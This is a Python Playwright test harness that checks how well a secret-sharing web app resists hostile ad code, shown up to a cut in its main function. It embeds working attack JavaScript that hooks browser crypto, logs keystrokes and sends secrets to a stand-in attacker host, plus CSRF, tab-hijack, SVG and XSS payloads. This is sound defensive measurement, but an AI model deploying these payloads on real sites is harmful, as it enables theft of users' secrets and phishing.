#!/usr/bin/env python3
"""Hostile-ad harness for apikeybin.

Question this answers, by measurement rather than by argument:

    If an ad (or anything else a third party controls) is hostile, what can it
    actually obtain in each way of arranging ads around the page that handles
    the secret?

Every host is a reserved `.test` name fulfilled inside Playwright. Nothing leaves
this machine; a request to any other host is aborted and recorded, and the run
fails if that ever happens.

Positive controls matter here. "No leak" means nothing unless the same hostile
code demonstrably ran and demonstrably could have leaked. So:

  * every hostile script pings the collector with tag=ran, and a variant whose
    hostile code did not run is reported as such, not as safe;
  * the variants expected to leak (A, B, H, J0 ...) are part of the run. If they
    stop leaking, the harness itself is broken and the run fails.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import hashlib
import json
import os
import secrets
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, unquote, urlparse

from playwright.async_api import async_playwright

APP = "https://apikeybin.test"
DOCS = "https://docs.apikeybin.test"
ADS = "https://ads.evil.test"
COLLECT = "https://collector.evil.test"
BANNER = "https://img.adnet.test"
CLICK = "https://click.adnet.test"

SECRET = "sk-live-CANARY-" + "0123456789abcdef"
HERE = Path(__file__).resolve().parent
JS = (HERE / "app.js").read_text(encoding="utf-8")

STRICT_CSP = (
    "default-src 'none'; script-src 'self'; connect-src 'self'; "
    "base-uri 'none'; form-action 'none'; frame-ancestors 'none'; "
    "require-trusted-types-for 'script'"
)

HOSTILE_TOP = """
(function () {
  var C = %(collector)s;
  function leak(tag, val) {
    var q = C + '?tag=' + encodeURIComponent(tag);
    var v = String(val);
    try { new Image().src = q + '&via=img&d=' + encodeURIComponent(v); } catch (e) {}
    try { fetch(q + '&via=fetch', { method: 'POST', mode: 'no-cors', body: v }).catch(function () {}); } catch (e) {}
    try { navigator.sendBeacon(q + '&via=beacon', v); } catch (e) {}
  }
  leak('ran', '1');
  leak('href', location.href);
  try {
    var s = crypto.subtle;
    var oI = s.importKey.bind(s);
    s.importKey = function (fmt, data) {
      try { leak('importKey', btoa(String.fromCharCode.apply(null, new Uint8Array(data)))); } catch (e) {}
      return oI.apply(null, arguments);
    };
    var oD = s.decrypt.bind(s);
    s.decrypt = function () {
      return oD.apply(null, arguments).then(function (pt) {
        try { leak('decrypt', new TextDecoder().decode(pt)); } catch (e) {}
        return pt;
      });
    };
    var oE = s.encrypt.bind(s);
    s.encrypt = function (alg, key, data) {
      try { leak('encrypt', new TextDecoder().decode(data)); } catch (e) {}
      return oE.apply(null, arguments);
    };
  } catch (e) { leak('hook_failed', e && e.name); }
  new MutationObserver(function () {
    var el = document.getElementById('secret');
    if (el && el.textContent) leak('dom', el.textContent);
    var o = document.getElementById('link');
    if (o && o.textContent) leak('link', o.textContent);
  }).observe(document, { subtree: true, childList: true, characterData: true });
  document.addEventListener('input', function (e) { leak('keystroke', e.target.value); }, true);
})();
"""

HOSTILE_FRAME = """
(function () {
  var C = %(collector)s;
  function leak(tag, val) {
    var q = C + '?tag=' + encodeURIComponent(tag);
    try { new Image().src = q + '&via=img&d=' + encodeURIComponent(String(val)); } catch (e) {}
  }
  leak('ran', '1');
  leak('frame_referrer', document.referrer);
  function attempt(name, fn) {
    try { leak(name, fn()); } catch (e) { leak(name + '_blocked', e && e.name); }
  }
  attempt('parent_href', function () { return parent.location.href; });
  attempt('parent_dom', function () { return parent.document.documentElement.outerHTML; });
  attempt('parent_secret', function () { return parent.document.getElementById('secret').textContent; });
  attempt('parent_input', function () { return parent.document.getElementById('in').value; });
  attempt('parent_hook', function () { parent.crypto.subtle.decrypt = function () {}; return 'hooked'; });
  setTimeout(function () {
    try { top.location = %(collector_root)s + '/hijack?how=no_click'; } catch (e) { leak('topnav_noclick_blocked', e && e.name); }
  }, 150);
  document.addEventListener('click', function () {
    try { top.location = %(collector_root)s + '/hijack?how=click'; } catch (e) { leak('topnav_click_blocked', e && e.name); }
  });
})();
"""

HOSTILE_DOCS = """
(function () {
  var C = %(collector)s;
  function leak(tag, val) { new Image().src = C + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(val)); }
  leak('ran', '1');
  try { document.cookie = 'tossed=1; domain=apikeybin.test; path=/; Secure; SameSite=None'; leak('cookie_set', document.cookie); } catch (e) { leak('cookie_blocked', e.name); }
  fetch(%(app)s + '/api/s/' + %(known_id)s + '/consume', { method: 'POST', mode: 'no-cors', body: 'x' })
    .then(function () { leak('csrf_sent', '1'); }, function () { leak('csrf_failed', '1'); });
  document.addEventListener('click', function (e) {
    var a = e.target && e.target.closest && e.target.closest('a');
    if (!a) return;
    e.preventDefault();
    var w = window.open(a.href);
    leak('popup_opened', w ? '1' : '0');
    setTimeout(function () {
      try { leak('popup_href', w.location.href); } catch (err) { leak('popup_href_blocked', err.name); }
      try { leak('popup_secret', w.document.getElementById('secret').textContent); } catch (err) { leak('popup_dom_blocked', err.name); }
      try { w.location = %(collector_root)s + '/hijack?how=opener'; } catch (err) { leak('popup_nav_blocked', err.name); }
    }, 600);
  }, true);
})();
"""

SVG_PAYLOAD = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="250" '
    'onload="fetch(\'%s?tag=svg_ran&amp;d=1\',{mode:\'no-cors\'})">'
    "<script>fetch('%s?tag=svg_ran&amp;d=2',{mode:'no-cors'})</script>"
    '<rect width="300" height="250" fill="#88a"/></svg>'
)


@dataclass
class Variant:
    name: str
    title: str
    expect_plaintext_leak: bool
    expect_key_leak: bool
    head: str = ""
    body: str = ""
    csp: str | None = STRICT_CSP
    referrer_policy: str | None = "no-referrer"
    coop: str | None = "same-origin"
    app_js: str | None = None  # override of the JS the origin serves
    ran_expected: bool = True
    run_docs_flow: bool = False
    click_ad_frame: bool = False


def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


class World:
    """All virtual hosts. Records every request it sees."""

    def __init__(self, v: Variant):
        self.v = v
        self.log: list[dict[str, Any]] = []
        self.store: dict[str, dict[str, str]] = {}
        self.external: list[str] = []
        self.known_id = "known" + secrets.token_hex(8)
        self.store[self.known_id] = {"iv": "AAAA", "ct": "AAAA"}
        self.consumed_cross_site: list[str] = []
        self.served: dict[str, bytes] = {}
        self.harness_errors: list[str] = []
        self.redirect_unmeasured = ""

    async def handle(self, route, request):
        u = urlparse(request.url)
        host = u.hostname or ""
        try:
            headers = await request.all_headers()
        except Exception:
            headers = dict(request.headers)
        body = request.post_data_buffer or b""
        self.log.append({
            "url": request.url,
            "method": request.method,
            "host": host,
            "path": u.path,
            "query": u.query,
            "referer": headers.get("referer"),
            "cookie": headers.get("cookie"),
            "sec_fetch_site": headers.get("sec-fetch-site"),
            "resource": request.resource_type,
            "body": body.decode("utf-8", "replace"),
        })
        if not host.endswith(".test"):
            self.external.append(request.url)
            await route.abort()
            return
        try:
            await self.dispatch(route, request, host, u, headers, body)
        except Exception as e:  # never hang the page on a harness bug
            self.harness_errors.append(f"{request.url}: {type(e).__name__}: {e}")
            try:
                await route.fulfill(status=500, body="harness error")
            except Exception:  # already handled, or the page went away
                pass

    def sec_headers(self) -> dict[str, str]:
        h = {
            "X-Content-Type-Options": "nosniff",
            "Cache-Control": "no-store",
            "Cross-Origin-Resource-Policy": "same-origin",
        }
        if self.v.csp:
            h["Content-Security-Policy"] = self.v.csp
        if self.v.referrer_policy:
            h["Referrer-Policy"] = self.v.referrer_policy
        if self.v.coop:
            h["Cross-Origin-Opener-Policy"] = self.v.coop
        return h

    async def html(self, route, body: str, extra: dict[str, str] | None = None):
        h = {"Content-Type": "text/html; charset=utf-8", **self.sec_headers()}
        if extra:
            h.update(extra)
        await route.fulfill(status=200, headers=h, body=body)

    def ad_vars(self) -> dict[str, str]:
        return {
            "collector": json.dumps(COLLECT + "/c"),
            "collector_root": json.dumps(COLLECT),
            "app": json.dumps(APP),
            "known_id": json.dumps(self.known_id),
        }

    async def dispatch(self, route, request, host, u, headers, body):
        if host == "apikeybin.test":
            await self.app(route, request, u, headers, body)
        elif host == "docs.apikeybin.test":
            await self.html(
                route,
                f'<!doctype html><meta charset=utf-8><title>docs</title>'
                f'<script src="{ADS}/docs_ad.js"></script>'
                f'<h1>docs</h1><a id="go" href="{APP}/new">create</a>',
                {"Content-Security-Policy": "default-src * 'unsafe-inline'"},
            )
        elif host == "ads.evil.test":
            await self.ads(route, u)
        elif host == "collector.evil.test":
            if u.path.startswith("/hijack"):
                await route.fulfill(status=200, headers={"Content-Type": "text/html"},
                                    body="<!doctype html><title>phish</title><p>phishing page</p>")
            else:
                await route.fulfill(status=204, headers={"Access-Control-Allow-Origin": "*"})
        elif host == "img.adnet.test":
            await self.banner(route, u)
        elif host == "click.adnet.test":
            await route.fulfill(status=200, headers={"Content-Type": "text/html"},
                                body="<!doctype html><title>advertiser</title>"
                                     f"<script>new Image().src={json.dumps(COLLECT + '/c')}+'?tag=click_referrer&d='+encodeURIComponent(document.referrer);"
                                     f"new Image().src={json.dumps(COLLECT + '/c')}+'?tag=click_opener&d='+(window.opener?'present':'null');"
                                     f"try{{if(window.opener)window.opener.location={json.dumps(COLLECT + '/hijack?how=tabnabbing')}}}catch(e){{}}</script>")
        else:
            await route.fulfill(status=404, body="unknown .test host")

    async def app(self, route, request, u, headers, body):
        p = u.path
        if p == "/app.js":
            js = self.v.app_js if self.v.app_js is not None else JS
            self.served["app.js"] = js.encode()
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript; charset=utf-8", **self.sec_headers()}, body=js)
        elif p == "/new":
            await self.html(route, self.page(
                '<textarea id="in"></textarea><button id="make">make</button><output id="link"></output>'))
        elif p.startswith("/s/"):
            await self.html(route, self.page(
                '<button id="reveal">reveal</button><pre id="secret"></pre><p id="status"></p>'),
                {"X-Robots-Tag": "noindex, nofollow"})
        elif p == "/control-svg":
            await route.fulfill(status=200, headers={"Content-Type": "text/html; charset=utf-8"},
                                body=f'<!doctype html><meta charset=utf-8><object data="{BANNER}/banner.svg" type="image/svg+xml" width=300 height=250></object>')
        elif p == "/api/s" and request.method == "POST":
            sid = secrets.token_urlsafe(16)
            self.store[sid] = json.loads(body.decode())
            await route.fulfill(status=201, headers={"Content-Type": "application/json", "Cache-Control": "no-store"},
                                body=json.dumps({"id": sid}))
        elif p.startswith("/api/s/") and p.endswith("/consume") and request.method == "POST":
            sid = p.split("/")[3]
            # The API refuses anything that is not a same-origin fetch from our own page.
            if headers.get("sec-fetch-site") not in ("same-origin", None) or headers.get("x-apikeybin") != "1":
                self.consumed_cross_site.append(sid)
                await route.fulfill(status=403, headers={"Cache-Control": "no-store"}, body="forbidden")
                return
            rec = self.store.pop(sid, None)
            if rec is None:
                await route.fulfill(status=404, headers={"Cache-Control": "no-store"}, body="gone")
            else:
                await route.fulfill(status=200, headers={"Content-Type": "application/json", "Cache-Control": "no-store"},
                                    body=json.dumps(rec))
        elif p == "/api/collect":  # exists only so a compromised app.js has a same-origin place to send to
            await route.fulfill(status=204)
        elif p == "/favicon.ico":
            await route.fulfill(status=404, body="")
        else:
            await route.fulfill(status=404, body="not found")

    def page(self, inner: str) -> str:
        return (
            "<!doctype html><html><head><meta charset=utf-8><title>send</title>"
            f"{self.v.head}"
            '<script src="/app.js" defer></script></head><body>'
            f"{inner}{self.v.body}</body></html>"
        )

    async def ads(self, route, u):
        v = self.ad_vars()
        if u.path == "/ad.js":
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript"}, body=HOSTILE_TOP % v)
        elif u.path == "/ad_same_host.js":
            vv = dict(v)
            vv["collector"] = json.dumps(ADS + "/c")
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript"}, body=HOSTILE_TOP % vv)
        elif u.path == "/frame.html":
            await route.fulfill(status=200, headers={"Content-Type": "text/html; charset=utf-8"},
                                body="<!doctype html><meta charset=utf-8><body style='margin:0;height:250px;background:#fc8'>ad"
                                     f"<script>{HOSTILE_FRAME % v}</script></body>")
        elif u.path == "/docs_ad.js":
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript"}, body=HOSTILE_DOCS % v)
        elif u.path == "/c":  # exfil to the host CSP had to allow
            await route.fulfill(status=204, headers={"Access-Control-Allow-Origin": "*"})
        else:
            await route.fulfill(status=404, body="")

    async def banner(self, route, u):
        c = COLLECT + "/c"
        if u.path == "/banner.svg":
            await route.fulfill(status=200, headers={"Content-Type": "image/svg+xml",
                                                     "Set-Cookie": "adnet=1; Path=/; Secure; SameSite=None"},
                                body=SVG_PAYLOAD % (c, c))
        elif u.path == "/banner.html":
            await route.fulfill(status=200, headers={"Content-Type": "text/html"},
                                body=f"<script>new Image().src='{c}?tag=html_as_img_ran&d=1'</script>")
        elif u.path == "/redirect.gif":
            try:
                await route.fulfill(status=302, headers={"Location": f"{c}?tag=img_redirect_followed&d=1"})
            except Exception as e:  # WebKit under Playwright refuses; real_server_probe.py covers it
                self.redirect_unmeasured = str(e)[:120]
                await route.fulfill(status=404, body="")
        elif u.path == "/0.gif":
            await route.fulfill(status=200, headers={"Content-Type": "image/gif"},
                                body=base64.b64decode("R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="))
        else:
            await route.fulfill(status=404, body="")

    # -- analysis ---------------------------------------------------------
    def hostile_entries(self) -> list[dict[str, Any]]:
        out = []
        for r in self.log:
            hostile = r["host"] in ("collector.evil.test", "img.adnet.test", "click.adnet.test") or \
                (r["host"] == "ads.evil.test" and r["path"] == "/c")
            # A compromised origin sends to its own /api/collect.
            hostile = hostile or r["path"] == "/api/collect"
            if hostile:
                out.append(r)
        return out

    def tags(self) -> set[str]:
        t = set()
        for r in self.hostile_entries():
            q = parse_qs(r["query"])
            if "tag" in q:
                t.add(q["tag"][0])
        return t

    def contains(self, needles: list[str]) -> list[str]:
        """Which hostile requests carried one of the needles, and under what tag."""
        hits = []
        for r in self.hostile_entries():
            hay = unquote(r["query"]) + "\n" + r["body"] + "\n" + (r["referer"] or "")
            if any(n and n in hay for n in needles):
                tag = (parse_qs(r["query"]).get("tag") or [r["path"]])[0]
                hits.append(tag)
        return sorted(set(hits))

    def app_requests_with(self, needle: str) -> list[str]:
        return [r["url"] for r in self.log
                if r["host"] == "apikeybin.test" and r["path"] != "/api/collect" and needle in (r["url"] + r["body"])]


def compromised_app_js() -> str:
    # What an attacker with write access to the origin ships. Note it stays inside
    # `connect-src 'self'`: CSP does not help because the attacker owns the origin.
    return JS + """
;(function () {
  var s = crypto.subtle, oI = s.importKey.bind(s), oD = s.decrypt.bind(s), oE = s.encrypt.bind(s);
  function send(tag, v) { fetch('/api/collect?tag=' + tag, { method: 'POST', body: String(v) }); }
  send('ran', 1);
  s.importKey = function (f, d) { try { send('importKey', btoa(String.fromCharCode.apply(null, new Uint8Array(d)))); } catch (e) {} return oI.apply(null, arguments); };
  s.decrypt = function () { return oD.apply(null, arguments).then(function (p) { send('decrypt', new TextDecoder().decode(p)); return p; }); };
  s.encrypt = function (a, k, d) { send('encrypt', new TextDecoder().decode(d)); return oE.apply(null, arguments); };
})();
"""


def build_variants() -> list[Variant]:
    ad_csp = (
        f"default-src 'none'; script-src 'self' {ADS}; connect-src 'self' {ADS}; img-src {ADS}; "
        "base-uri 'none'; form-action 'none'; frame-ancestors 'none'"
    )
    frame_csp = STRICT_CSP + f"; frame-src {ADS}"
    banner_csp = STRICT_CSP + f"; img-src {BANNER}"
    banner_html = (
        f'<a id="banner" href="{CLICK}/c?id=1" target="_blank" rel="noopener noreferrer">'
        f'<img alt="ad" src="{BANNER}/banner.svg" width="300" height="250"></a>'
        f'<img alt="" src="{BANNER}/banner.html" width="1" height="1">'
        f'<img alt="" src="{BANNER}/redirect.gif" width="1" height="1">'
        f'<img alt="" src="{BANNER}/0.gif?media=TESTMEDIA" width="1" height="1">'
    )
    return [
        Variant("A_same_page_script", "同じページに広告スクリプト（AdSense の貼り方）・CSP なし",
                True, True, head=f'<script src="{ADS}/ad.js"></script>', csp=None, referrer_policy=None, coop=None),
        Variant("B_same_page_script_csp", "同じページに広告スクリプト・CSP で広告の配信元だけ許可",
                True, True, head=f'<script src="{ADS}/ad_same_host.js"></script>', csp=ad_csp),
        Variant("C_iframe_plain", "同じページ・広告は別オリジンの iframe（sandbox なし）",
                False, False, body=f'<iframe id="ad" src="{ADS}/frame.html" width="300" height="250"></iframe>',
                csp=frame_csp, click_ad_frame=True),
        Variant("D_iframe_sandbox", "同じページ・広告は sandbox iframe（allow-scripts のみ）",
                False, False,
                body=f'<iframe id="ad" sandbox="allow-scripts" src="{ADS}/frame.html" width="300" height="250"></iframe>',
                csp=frame_csp, click_ad_frame=True),
        Variant("E_static_banner", "同じページ・スクリプトなしの画像バナーだけ（img と a のみ）",
                False, False, body=banner_html, csp=banner_csp, ran_expected=False),
        Variant("F1_separate_noCOOP", "広告は別オリジンのページ・秘密のページに COOP なし（対照）",
                False, False, coop=None, run_docs_flow=True),
        Variant("F2_separate_COOP", "広告は別オリジンのページ・秘密のページに COOP あり",
                False, False, run_docs_flow=True),
        Variant("H_compromised_origin", "配信サーバが乗っ取られ app.js を差し替えられた",
                True, True, app_js=compromised_app_js()),
    ]


async def wait_until(pred, timeout=4.0, step=0.05) -> bool:
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if pred():
            return True
        await asyncio.sleep(step)
    return pred()


async def wait_text(page, selector: str, timeout: float = 8.0) -> str:
    """Wait until an element has text. Runs in Playwright's isolated world, so the
    page's own CSP (no unsafe-eval) applies to the page and not to this probe."""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        t = await page.locator(selector).first.text_content()
        if t:
            return t
        await asyncio.sleep(0.05)
    raise TimeoutError(f"no text in {selector} after {timeout}s")


async def run_variant(browser, v: Variant) -> dict[str, Any]:
    world = World(v)
    ctx = await browser.new_context()
    await ctx.route("**/*", world.handle)
    popups: list[Any] = []
    ctx.on("page", lambda p: popups.append(p))
    result: dict[str, Any] = {"variant": v.name, "title": v.title}
    consoles: list[str] = []

    # sender flow -----------------------------------------------------------
    page = await ctx.new_page()
    page.on("console", lambda m: consoles.append(m.text))
    page.on("pageerror", lambda e: consoles.append("pageerror: " + str(e)))
    await page.goto(f"{APP}/new", wait_until="domcontentloaded")
    await page.fill("#in", SECRET)
    await page.click("#make")
    await wait_text(page, '#link')
    link = await page.text_content("#link")
    await page.wait_for_timeout(250)
    key_b64u = link.split("#", 1)[1]
    pad = "=" * (-len(key_b64u) % 4)
    key_std = base64.b64encode(base64.urlsafe_b64decode(key_b64u + pad)).decode()
    sid = urlparse(link).path.split("/")[-1]
    stored = dict(world.store.get(sid, {}))
    await page.close()

    # receiver flow ---------------------------------------------------------
    page = await ctx.new_page()
    page.on("console", lambda m: consoles.append(m.text))
    page.on("pageerror", lambda e: consoles.append("pageerror: " + str(e)))
    await page.goto(link, wait_until="domcontentloaded")
    await page.click("#reveal")
    await wait_text(page, '#secret')
    shown = await page.text_content("#secret")
    url_after = page.url
    await page.wait_for_timeout(500)

    result["roundtrip_ok"] = shown == SECRET
    result["key_removed_from_address_bar"] = "#" not in url_after
    result["secret_burned_after_read"] = sid not in world.store

    # What can the iframe do to the top page? ------------------------------
    hijack_no_click = None
    hijack_click = None
    if v.click_ad_frame:
        await page.wait_for_timeout(400)
        hijack_no_click = "hijack" in page.url
        if hijack_no_click:
            await page.goto(f"{APP}/new", wait_until="domcontentloaded")
            await page.wait_for_timeout(300)
        before = page.url
        try:
            await page.frame_locator("#ad").locator("body").click(timeout=3000)
        except Exception as e:  # noqa: BLE001
            result["ad_click_error"] = type(e).__name__
        await page.wait_for_timeout(700)
        hijack_click = "hijack" in page.url and "how=click" in page.url
        result["after_ad_click_url"] = page.url if page.url != before else "(unchanged)"
    result["top_hijacked_without_click"] = hijack_no_click
    result["top_hijacked_on_ad_click"] = hijack_click

    # Docs origin with hostile script (F) ----------------------------------
    if v.run_docs_flow:
        docs = await ctx.new_page()
        await docs.goto(f"{DOCS}/", wait_until="domcontentloaded")
        await docs.wait_for_timeout(300)
        n_before = len(popups)
        await docs.click("#go")
        await wait_until(lambda: len(popups) > n_before, 3.0)
        await docs.wait_for_timeout(1200)
        popup = popups[n_before] if len(popups) > n_before else None
        result["opener_hijacked_app_tab"] = bool(popup and "hijack" in popup.url)
        result["cookie_reached_app"] = any(
            r["host"] == "apikeybin.test" and r["cookie"] and "tossed" in r["cookie"] for r in world.log)
        result["cross_site_consume_refused"] = world.known_id in world.consumed_cross_site
        result["known_id_still_stored"] = world.known_id in world.store

    # Static banner (E) ----------------------------------------------------
    if v.name.startswith("E_"):
        # Click through to the advertiser.
        p2 = await ctx.new_page()
        await p2.goto(f"{APP}/s/none", wait_until="domcontentloaded")
        async with ctx.expect_page() as adv_info:
            await p2.click("#banner")
        adv = await adv_info.value
        await adv.wait_for_load_state("load")
        await adv.wait_for_timeout(400)
        await p2.wait_for_timeout(200)
        result["tabnabbing_hijacked"] = "hijack" in p2.url
        await adv.close()
        await p2.close()
        # Everything below is read before the control page below can pollute it.
        before_ctl = [r for r in world.log if r["host"] == "img.adnet.test"]
        result["banner_host_saw_referers"] = sorted({str(r["referer"]) for r in before_ctl})
        result["banner_host_saw_cookies"] = sorted({str(r["cookie"]) for r in before_ctl})
        result["banner_requests"] = len(before_ctl)
        result["banner_request_paths"] = sorted({r["path"] for r in before_ctl})
        click_tags = {}
        for r in world.hostile_entries():
            q = parse_qs(r["query"])
            if q.get("tag", [""])[0] in ("click_referrer", "click_opener"):
                click_tags[q["tag"][0]] = (q.get("d") or [""])[0]
        result["advertiser_saw"] = click_tags
        # What fired while the banner sat on the secret page, before any control ran.
        result["banner_hostile_tags"] = sorted(
            t for t in world.tags() if t in ("svg_ran", "html_as_img_ran", "img_redirect_followed"))
        # Positive control: the same SVG payload IS live when embedded as <object>.
        ctl = await ctx.new_page()
        await ctl.goto(f"{BANNER}/banner.svg", wait_until="domcontentloaded")
        await ctl.wait_for_timeout(800)
        await ctl.close()
        result["svg_control_fired"] = "svg_ran" in world.tags()

    await page.close()
    await asyncio.sleep(0.3)

    tags = world.tags()
    result["hostile_ran"] = "ran" in tags or "svg_ran" in tags
    result["tags_seen"] = sorted(tags)
    result["plaintext_leaked_via"] = world.contains([SECRET])
    result["key_leaked_via"] = world.contains([key_b64u, key_std])
    result["server_saw_key"] = bool(world.app_requests_with(key_b64u))
    result["server_stored_plaintext"] = SECRET in json.dumps(stored)
    result["external_requests"] = world.external
    result["served_app_js_sha256"] = hashlib.sha256(world.served.get("app.js", b"")).hexdigest()
    result["console_sample"] = consoles[:6]
    result["harness_errors"] = world.harness_errors[:5]
    result["redirect_unmeasured"] = world.redirect_unmeasured

    await ctx.unroute_all(behavior="ignoreErrors")
    await ctx.close()
    return result


async def run_special(browser) -> list[dict[str, Any]]:
    """Self-contained checks that are not about ad placement."""
    out: list[dict[str, Any]] = []

    # J: a stored-XSS style bug in our own page. J0 is the control.
    bug_js = JS.replace("$('secret').textContent = text", "$('secret').innerHTML = text")
    assert bug_js != JS, "bug injection did not apply"
    payload = f"<img src=x onerror=\"new Image().src='{COLLECT}/c?tag=xss_fired&d=1'\">"
    for name, csp, expect in [
        ("J0_xss_no_csp_control", None, True),
        ("J1_xss_strict_csp", STRICT_CSP, False),
    ]:
        v = Variant(name, "秘密の中身に HTML・描画に innerHTML のバグ", False, False, csp=csp, app_js=bug_js, ran_expected=False)
        w = World(v)
        ctx = await browser.new_context()
        await ctx.route("**/*", w.handle)
        key = secrets.token_bytes(32)
        p = await ctx.new_page()
        await p.goto(f"{APP}/new", wait_until="domcontentloaded")
        await p.fill("#in", payload)
        await p.click("#make")
        await wait_text(p, '#link')
        link = await p.text_content("#link")
        await p.close()
        p = await ctx.new_page()
        errors: list[str] = []
        p.on("pageerror", lambda e: errors.append(str(e)))
        await p.goto(link, wait_until="domcontentloaded")
        await p.click("#reveal")
        await p.wait_for_timeout(1200)
        fired = "xss_fired" in w.tags()
        await ctx.unroute_all(behavior="ignoreErrors")
        await ctx.close()
        out.append({"check": name, "xss_fired": fired, "expected_fire": expect, "ok": fired == expect, "page_errors": errors[:2]})
        del key

    # K: link-preview bots must not burn the secret.
    v = Variant("K", "", False, False, ran_expected=False)
    w = World(v)
    ctx = await browser.new_context()
    await ctx.route("**/*", w.handle)
    p = await ctx.new_page()
    await p.goto(f"{APP}/new", wait_until="domcontentloaded")
    await p.fill("#in", SECRET)
    await p.click("#make")
    await wait_text(p, '#link')
    link = await p.text_content("#link")
    await p.close()
    sid = urlparse(link).path.split("/")[-1]
    # a) a bot that runs JavaScript and loads the page but never clicks.
    bot = await ctx.new_page()
    await bot.goto(link, wait_until="domcontentloaded")
    await bot.wait_for_timeout(600)
    survived_js_bot = sid in w.store
    await bot.close()
    # b) a human after it, who should still be able to read it.
    human = await ctx.new_page()
    await human.goto(link, wait_until="domcontentloaded")
    await human.click("#reveal")
    await wait_text(human, '#secret')
    readable = (await human.text_content("#secret")) == SECRET
    await human.close()
    # c) second read must fail.
    again = await ctx.new_page()
    await again.goto(link, wait_until="domcontentloaded")
    await again.click("#reveal")
    await wait_text(again, '#status')
    second = await again.text_content("#status")
    await again.close()
    frag_on_wire = any("#" in r["url"] for r in w.log if r["host"] == "apikeybin.test")
    await ctx.close()
    out.append({"check": "K_link_preview_bot", "survived_js_bot": survived_js_bot, "human_could_read": readable,
                "second_read_status": second, "fragment_reached_server": frag_on_wire,
                "ok": survived_js_bot and readable and second == "gone" and not frag_on_wire})

    # L: database stolen and tampered with.
    v = Variant("L", "", False, False, ran_expected=False)
    w = World(v)
    ctx = await browser.new_context()
    await ctx.route("**/*", w.handle)
    p = await ctx.new_page()
    await p.goto(f"{APP}/new", wait_until="domcontentloaded")
    await p.fill("#in", SECRET)
    await p.click("#make")
    await wait_text(p, '#link')
    link = await p.text_content("#link")
    await p.close()
    sid = urlparse(link).path.split("/")[-1]
    dump = json.dumps(w.store)
    key_b64u = link.split("#", 1)[1]
    dump_has_plain = SECRET in dump
    dump_has_key = key_b64u in dump
    rec = w.store[sid]
    ct = bytearray(base64.urlsafe_b64decode(rec["ct"] + "=" * (-len(rec["ct"]) % 4)))
    ct[0] ^= 1
    rec["ct"] = b64u(bytes(ct))
    p = await ctx.new_page()
    await p.goto(link, wait_until="domcontentloaded")
    await p.click("#reveal")
    await wait_text(p, '#status')
    status = await p.text_content("#status")
    shown = await p.text_content("#secret")
    await p.close()
    await ctx.close()
    out.append({"check": "L_db_breach_and_tamper", "dump_has_plaintext": dump_has_plain, "dump_has_key": dump_has_key,
                "tampered_status": status, "tampered_shown": shown,
                "ok": (not dump_has_plain) and (not dump_has_key) and status == "tampered" and not shown})

    # M: does the fragment ever appear in a Referer? unsafe-url is the worst case.
    # The positive control is a same-origin subresource: its Referer must show the path,
    # which proves we would have seen a fragment if the browser had sent one. Cross-site
    # is only observed, because some engines refuse to relax a cross-site referrer.
    v = Variant("M", "", False, False, referrer_policy="unsafe-url", ran_expected=False,
                body=f'<img alt="" src="{BANNER}/0.gif"><img alt="" src="/pixel.gif">',
                csp=STRICT_CSP + f"; img-src 'self' {BANNER}")
    w = World(v)
    ctx = await browser.new_context()
    await ctx.route("**/*", w.handle)
    p = await ctx.new_page()
    await p.goto(f"{APP}/s/abc#THEFRAGMENTKEY", wait_until="domcontentloaded")
    await p.wait_for_timeout(500)
    await p.close()
    cross = sorted({str(r["referer"]) for r in w.log if r["host"] == "img.adnet.test"})
    same = sorted({str(r["referer"]) for r in w.log if r["path"] == "/pixel.gif"})
    everywhere = cross + same
    await ctx.close()
    out.append({"check": "M_fragment_in_referer_unsafe_url", "cross_site_referers": cross, "same_origin_referers": same,
                "path_visible_control": any("/s/abc" in x for x in same),
                "fragment_leaked": any("THEFRAGMENTKEY" in x for x in everywhere),
                "ok": any("/s/abc" in x for x in same) and not any("THEFRAGMENTKEY" in x for x in everywhere)})
    return out


def judge(r: dict[str, Any], v: Variant) -> list[str]:
    problems = []
    if not r["roundtrip_ok"]:
        problems.append("page did not work: round trip failed")
    if r["external_requests"]:
        problems.append(f"traffic left the harness: {r['external_requests'][:3]}")
    if v.ran_expected and "ran" not in r["tags_seen"]:
        problems.append("hostile code did not run, so 'no leak' would be vacuous")
    if bool(r["plaintext_leaked_via"]) != v.expect_plaintext_leak:
        problems.append(f"plaintext leak expected={v.expect_plaintext_leak} got={r['plaintext_leaked_via']}")
    if bool(r["key_leaked_via"]) != v.expect_key_leak:
        problems.append(f"key leak expected={v.expect_key_leak} got={r['key_leaked_via']}")
    if r["server_saw_key"]:
        problems.append("the key reached the server")
    if r["server_stored_plaintext"]:
        problems.append("the server stored plaintext")
    if v.name.startswith("E_"):
        if r.get("banner_hostile_tags"):
            problems.append(f"hostile banner code ran on the secret page: {r['banner_hostile_tags']}")
        if not r.get("svg_control_fired"):
            problems.append("positive control failed: the SVG payload never fired anywhere, so the banner result is vacuous")
    return problems


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=str(HERE / "results.json"))
    ap.add_argument("--browsers", default="chromium,webkit,firefox")
    ap.add_argument("--only", default="")
    args = ap.parse_args()

    variants = build_variants()
    if args.only:
        variants = [v for v in variants if v.name.startswith(args.only)]
    all_results: dict[str, Any] = {"generated_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "secret": SECRET, "browsers": {}}
    failures = 0
    async with async_playwright() as pw:
        for bname in args.browsers.split(","):
            btype = getattr(pw, bname)
            browser = await btype.launch(headless=True)
            print(f"\n===== {bname} {browser.version}")
            res: dict[str, Any] = {"version": browser.version, "variants": [], "special": []}
            for v in variants:
                try:
                    r = await asyncio.wait_for(run_variant(browser, v), timeout=90)
                except Exception as e:  # noqa: BLE001
                    r = {"variant": v.name, "title": v.title, "harness_error": f"{type(e).__name__}: {e}",
                         "roundtrip_ok": False, "external_requests": [], "tags_seen": [], "plaintext_leaked_via": [],
